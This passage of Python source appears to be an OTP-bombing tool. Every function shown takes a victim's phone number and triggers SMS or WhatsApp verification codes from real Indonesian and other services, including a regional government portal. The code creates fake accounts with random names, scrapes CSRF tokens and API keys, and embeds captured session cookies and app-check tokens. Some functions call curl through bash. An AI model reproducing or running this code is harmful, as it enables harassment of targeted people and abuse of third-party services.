        resp1 = session.post(url, json=payload1, headers=headers, timeout=10)
        token = resp1.json().get('data', {}).get('checkPhone', {}).get('token')
        
        if token:
            # Step 2: Regenerate OTP
            headers['authorization'] = f'Bearer {token}'
            payload2 = {
                'variables': {},
                'query': 'mutation {\n regenerateOTP {\n otpExpiredAt\n }\n}'
            }
            resp2 = session.post(url, json=payload2, headers=headers, timeout=10)
            return resp2.status_code < 400
        else:
            return False
            
    except Exception as e:
        return False

def spam_otp_beautyhaul(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        session = requests.Session()
        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama_depan = random.choice(first)
        nama_belakang = random.choice(last)
        email = f'{nama_depan.lower()}{nama_belakang.lower()}{random.randint(10, 99)}@gmail.com'
        password = spam_otp_codex(10) + str(random.randint(10, 99))
        tgl = f"{random.randint(1, 28)} {random.choice(['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'])} {random.randint(1985, 2000)}"
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.beautyhaul.com', 'referer': 'https://www.beautyhaul.com/account/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        session.get('https://www.beautyhaul.com/account/register', headers={'user-agent': headers['user-agent']}, timeout=10)
        resp_reg = session.post('https://www.beautyhaul.com/ajax/account/save_register', json={'nama_depan': nama_depan, 'nama_belakang': nama_belakang, 'email': email, 'g-recaptcha-response': '', 'jenis_kelamin': random.choice(['Male', 'Female']), 'konfirmasi_password': password, 'nomor_kode_id': '100', 'nomor_kode_value': '62', 'nomor_ponsel': nomor, 'password': password, 'subscribe': 'true', 'tanggal_lahir': tgl, 'terms': 'true'}, headers=headers, timeout=10)
        if resp_reg.status_code != 200:
            return False
        resp = session.post('https://www.beautyhaul.com/ajax/account/send_otp', json={'method': 'WhatsApp'}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_byu(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        url = 'https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp'
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ3NDk2NzQiLCJhcCI6IjExMjA0MzgyNjEiLCJpZCI6IjBhZmM0ODY2ZDY3MWU5MzM3OTk3YWUxY2M5ZDEwMzI1NTQ1ZWM1YmVhMzkzMzVjIiwidHIiOiIwYWZjNDg2NmQ2NzFlOTMzNzk5N2FlMWNjOWQxMDMyNTU0NWVjNWJlYTM5MzM1YyIsImZlIjoiMTc3NzYwNzYzODUyOCIsInByIjoiMS40NzQ5MTc0LTExMjA0MzgyNjEtNTU0NWVjNWJlYTM5MzM1Yy0tMTc3NzYwNzYzODUyOCIsInR0IjoxLCJ0ayI6IjE4NjM1MTkiLCJzIjoiMDEifX0=',
            'origin': 'https://pidaw-webfront.cx.byu.id',
            'referer': 'https://pidaw-webfront.cx.byu.id/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'slocation': 'CL',
            'traceparent': '00-0afcc4866d671e9337997ae1cc9d1032-5545ec5bea39335c-01',
            'tracestate': '1863519@nr=0-1-4749174-1120438261-5545ec5bea39335c----1777607638528',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-deviceid': '17776076111271930882471',
            'x-request-id': 'a33150a0-87cd-48ea-89ad-7314024949aa'
        }
        
        payload = {
            'identifier': nomor_lokal,
            'channel': 'web'
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_astradaihatsu2(nomor):
    try:
        if nomor.startswith('0'):
            nomor_intl = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_intl = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_intl = '62' + nomor
        else:
            nomor_intl = nomor

        session = requests.Session()
        r1 = session.get('https://www.astra-daihatsu.id/register', 
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )
        
        import re
        csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
        if csrf:
            csrf_token = csrf.group(1)
            url = 'https://www.astra-daihatsu.id/otp/whatsapp/generate'
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/json; charset=UTF-8',
                'csrftoken': csrf_token,
                'origin': 'https://www.astra-daihatsu.id',
                'referer': 'https://www.astra-daihatsu.id/register',
                'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest'
            }
            payload = {'phoneNo': nomor_intl}
            r2 = session.post(url, json=payload, headers=headers, timeout=10)
            return r2.status_code < 400
        else:
            return False
            
    except Exception as e:
        return False

def spam_otp_astradaihatsu_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor_intl = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_intl = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_intl = '62' + nomor
        else:
            nomor_intl = nomor

        session = requests.Session()
        r1 = session.get('https://www.astra-daihatsu.id/register', 
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )
        
        import re
        csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
        if csrf:
            csrf_token = csrf.group(1)
            url = 'https://www.astra-daihatsu.id/otp/sms/generate'
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/json; charset=UTF-8',
                'csrftoken': csrf_token,
                'origin': 'https://www.astra-daihatsu.id',
                'referer': 'https://www.astra-daihatsu.id/register',
                'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest'
            }
            payload = {'phoneNo': nomor_intl}
            r2 = session.post(url, json=payload, headers=headers, timeout=10)
            return r2.status_code < 400
        else:
            return False
            
    except Exception as e:
        return False

def spam_otp_vedantu(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        
        session = requests.Session()
        
        url_login = 'https://user.vedantu.com/user/login/auth'
        headers_login = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.vedantu.com',
            'referer': 'https://www.vedantu.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        payload_login = {"ver": 12.269}
        
        resp_login = session.post(url_login, json=payload_login, headers=headers_login, timeout=10)
        
        if resp_login.status_code != 200:
            return False
        
        url_otp = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'
        headers_otp = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.vedantu.com',
            'referer': 'https://www.vedantu.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        payload_otp = {
            "email": None,
            "phoneCode": 62,
            "phoneNumber": nomor,
            "version": 2,
            "sType": "VEDANTU_F_7_N",
            "sValue": "FC34EE3DD29934CD6723BA8151D3E"
        }
        
        resp_otp = session.post(url_otp, json=payload_otp, headers=headers_otp, timeout=10)
        
        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                if data.get('status') == 'SUCCESS' or data.get('success') == True:
                    return True
                else:
                    return True
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_viuum(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://api.viuum.co.id/api_viuum/v1/customer/one-time-phone'
        
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://wearviuum.com',
            'referer': 'https://wearviuum.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {'number': nomor_lokal}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_onebunda(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
  -H 'host: cms.bunda.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-firebase-appcheck: eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjU5NjU2Mzg5ODEwMzp3ZWI6Y2VmNTMwYWNmYjgzZGY4NDdhZWRmMiIsImF1ZCI6WyJwcm9qZWN0cy81OTY1NjM4OTgxMDMiLCJwcm9qZWN0cy9ibWhzLXdlYi1hcHBzIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX3YzIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzU5NjU2Mzg5ODEwMyIsImV4cCI6MTc4NzIzNzQ1MCwiaWF0IjoxNzg3MTUxMDUwLCJqdGkiOiJ4YUEydzFUWnpxVHgtU2NHOGVQUGRqRkV3OHRVWUZhdXhfa3ExckthNVpBIn0.0GtUrReLPvBzyUZSeojw_D4CQfRcIhYS4kwTpuwMmbpQ8VquBJUyaEcSl28Rpq0_LrEcRkz-nHrAHtD2V-trDLQYzXIq2rC-JYWm3YadIDgh3FQ_nWrzdUUHfDLwCpgUU0QdopTXt1IkqEVK29vHjndK-s4yADZtVkV61DNzUKQKqCwcEH2Imw9q7GFEo19EhIYLIVd06Zdvit_GnPr93zYtuwzuIMPXcOghmqzsgER0vec2JQAr7oIc7Za47y_MNhtfJ5duSoDDb0MzyHaMJ0xX_-s6WIWT8gUI2uCwW2asUALRSouydvlOgMGpBkcZHAThBLYJ3k11iNEUUV-nwVb15PUjLM6y3XRHWXwEZ_1WAVy3GDFk-mxnGY8ez2X1xX64JJSVJMMqbwl_V0XccWPtlYEBP3MvmpgVl33lF6Pb9ZMaVAVv2C2h_8V6ik0rhsequDyDgd1as20UUagHfZEUIJCiMhktSc2yykuoGiXVTasq5dROxcQgEwPYN66x' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'x-locale: id' \\
  -H 'origin: https://www.bunda.co.id' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.bunda.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone_number":{phone},"type":"auth"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_ibudanbalita(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        session = requests.Session()
        first = ['Siti', 'Dewi', 'Rina', 'Maya', 'Fitri', 'Ani', 'Yuni', 'Rini', 'Lina', 'Nita']
        last = ['Rahayu', 'Santoso', 'Wijaya', 'Kusuma', 'Pratama', 'Sari', 'Putri', 'Wati', 'Hidayat', 'Lestari']
        nama = f'{random.choice(first)} {random.choice(last)}'
        chars = string.ascii_letters + string.digits + '!@#$%^&*'
        password = ''.join(random.choices(chars, k=12))
        ua = 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36'
        resp_page = session.get('https://www.ibudanbalita.com/poinprimagro/tabung-poin', headers={'user-agent': ua}, timeout=10)
        import re
        token_match = re.search(r'_token["\s]+content=["\s]*([^">\s]+)', resp_page.text)
        if not token_match:
            return False
        token = token_match.group(1)
        headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.ibudanbalita.com', 'user-agent': ua, 'x-csrf-token': token, 'x-requested-with': 'XMLHttpRequest'}
        data = {'full_name': nama, 'maternal_status': 'mother', 'due_date': '', 'dob': '', 'mobile': nomor_lokal, 'email': '', 'password': password, 'scregakp': '', 'children[full_name]': f'Anak {random.choice(first)}', 'children[dob]': f'202{random.randint(2,4)}-{str(random.randint(1,12)).zfill(2)}-{str(random.randint(1,28)).zfill(2)}', 'redirect': 'https://www.ibudanbalita.com/ebook', 'local_storage': 'none'}
        resp = session.post('https://www.ibudanbalita.com/aitindo/registration/register', data=data, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_swiggy(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        
        import random
        import string
        
        nama = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 10))).capitalize()
        
        session = requests.Session()
        
        headers_get = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        
        session.get('https://www.swiggy.com/auth', headers=headers_get, timeout=10)
        
        headers_post = {
            'accept': '*/*',
            '__fetch_req__': 'true',
            'content-type': 'application/json',
            'origin': 'https://www.swiggy.com',
            'platform': 'mweb',
            'referer': 'https://www.swiggy.com/auth/register',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'user-id': '0',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        
        payload = {
            'name': nama,
            'email': '',
            'mobile': nomor,
            'password': '',
            'referral_code': '',
            'countryCode': '62',
            'countryKey': 'IN'
        }
        
        resp = session.post('https://www.swiggy.com/mapi/auth/signup', 
                           json=payload, 
                           headers=headers_post, 
                           timeout=10)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                is_success = data.get('data', {}).get('is_success', False)
                if is_success:
                    return True
                return False
            except:
                return True if resp.status_code == 200 else False
        else:
            return False
                
    except Exception as e:
        return False

def spam_otp_cilory(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor[1:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://www.cilory.com/app/w/auth/soft'
        
        headers = {
            'accept': 'application/json',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.cilory.com',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            'mobile': nomor_lokal,
            'country_code': '+62'
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_naturalfarm(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        js_resp = session.get('https://www.naturalfarm.id/_nuxt/401b963.js', 
            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )
        
        import re
        key_match = re.search('dZp91nhRNg6u[^"]*', js_resp.text)
        if not key_match:
            return False
            
        api_key = key_match.group(0)
        
        wilayah = [
            {'province': 1, 'city': 161, 'subdistrict': 2236, 'label': 'Bali, Jembrana, Pekutatan'},
            {'province': 32, 'city': 322, 'subdistrict': 4569, 'label': 'Sumatera Barat, Padang Pariaman, 2 X 11 Kayu Tanam'}
        ]
        w = random.choice(wilayah)
        address_id = f"{w['province']}_{w['city']}_{w['subdistrict']}"
        
        first_names = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last_names = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra']
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f'{first_name.lower()}{last_name.lower()}{random.randint(10, 99)}@gmail.com'
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + str(random.randint(100, 999))
        year = random.randint(1985, 2000)
        month = random.randint(1, 12)
        day = random.randint(1, 28)
        birthdate = f'{year}-{str(month).zfill(2)}-{str(day).zfill(2)}'
        gender = random.choice([1, 2])
        streets = ['JL.Merdeka', 'JL.Sudirman', 'JL.Gatot Subroto', 'JL.Ahmad Yani', 'JL.Diponegoro']
        street = f'{random.choice(streets)} No. {random.randint(1, 100)}'
        
        url = 'https://api.naturalfarm.id/api/appv1-1/register/phone'
        headers = {
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=86400',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Host': 'api.naturalfarm.id',
            'key': api_key,
            'Origin': 'https://www.naturalfarm.id',
            'Referer': 'https://www.naturalfarm.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'phone': nomor_lokal,
            'password': password,
            'birthdate': birthdate,
            'gender': gender,
            'platform': 1,
            'province': w['province'],
            'city': w['city'],
            'subdistrict': w['subdistrict'],
            'address_id': address_id,
            'label': w['label'],
            'street': street,
            'referral_code': '',
            'card_code': None
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False


def spam_otp_gritero(nomor):
    try:
        if not nomor.startswith('62'):
            nomor_lokal = '62' + nomor.lstrip('0')
        else:
            nomor_lokal = nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fitri', 'Gita', 'Hadi', 'Indah', 'Joko']
        last = ['Santoso', 'Wijaya', 'Kusuma', 'Pratama', 'Sari', 'Putri', 'Rahayu', 'Wibowo']
        nama = f'{random.choice(first)} {random.choice(last)}'
        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email = f"{user}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"

        url = 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id'
        
        headers = {
            'accept': '*/*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'langcode': 'id',
            'origin': 'https://gritero.com',
            'referer': 'https://gritero.com/',
            'source': 'ocistok',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'xid': '2995761938'
        }
        
        payload = {
            'nama_lengkap': nama,
            'email': email,
            'telepon': nomor_lokal
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_toss(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        import random
        
        nik = ''.join([str(random.randint(0,9)) for _ in range(16)])
        token = "0LCXtW6VhWNOQviT5Oymo2xj1JQp5meEhaF2AhBq"
        
        curl_cmd = f"""curl -s -X POST 'https://toss.tubankab.go.id/register/otp/act' \\
  -H 'host: toss.tubankab.go.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://toss.tubankab.go.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://toss.tubankab.go.id/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.186516799.1783490717; _ga_QEWBPVNKLP=GS2.1.s1783490717$o1$g1$t1783490775$j2$l0$h0; _ga_LKLNRLDY51=GS2.1.s1783490717$o1$g1$t1783490775$j2$l0$h0; _ga_T5R13XZX0L=GS2.1.s1783490718$o1$g1$t1783490775$j3$l0$h0; XSRF-TOKEN=eyJpdiI6IjhWYUZzM0xQeDhXT3dGQmNkem5pUFE9PSIsInZhbHVlIjoic3Y2UGJBZG1wQklPb1JHN2lTNGtWbWFBSENaSUxIOHIzT2Uzb3VQeTBkZ3ZNNStsVmNpczlRMWcvTFJxdGdLcUNLMWJqTlBocE5OcnFxdE9XMUVsUzg4Q0xHUlZxejRoUUwzMEhUUUlEVU9BSTgzL3VPbUhVTFVuQlg1bDgwMEsiLCJtYWMiOiJlZjlmNDBmMDlmNzlmM2JiYjAxNmI4NWQ5ZDc5MTJjNTkyNDA1YWU1ZmI3M2E3ZjM1NWQ3NDQ0NTc3NjlmYWRhIiwidGFnIjoiIn0%3D; toss_session=eyJpdiI6InRsZHQyL093OEtqTlVENlVkUjZTUWc9PSIsInZhbHVlIjoiRXpsb2diL1d1L0Exa01wbkNWSytvY1dXNU41SExyakZSS2hEVEpnclpkeml4UlcxMmlkVjQrOG9lQ2JpY3drREwyc24vTUdVb1daMDdwWXczdCtxMFVndmkrM3dWV2w2ZXV6SHBJZStUcGdjUG5CbkEwTU0wUmI4Z3d5eFJWekUiLCJtYWMiOiI0MDYwZTI1YzIzMWZlNDJmYjNmZTc3Y2U5OTc0MmQ2OWE1MzIzOGUyYWQ2MDI0YjM0MTdjZDg5YjJjYmU0ZTYxIiwidGFnIjoiIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw 'nik={nik}&nohp={phone}&_token={token}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_topindosms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        import uuid
        import time
        
        uuid_device = str(uuid.uuid4())
        
        url = 'https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request'
        
        headers = {
            'Host': 'mobileapps.topindoku.co.id',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?1',
            'uuid': uuid_device,
            'Origin': 'https://mitra.topindoku.co.id',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "phone": phone,
            "via": "SMS",
            "hash": "gruenbf12d2",
            "fbc": "",
            "fbp": "fb.2.1784860943418.959857478235602163",
            "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_toss2(nomor):
    try:
        if nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        
        resp = session.get('https://toss.tubankab.go.id/register', headers=headers)
        
        import re
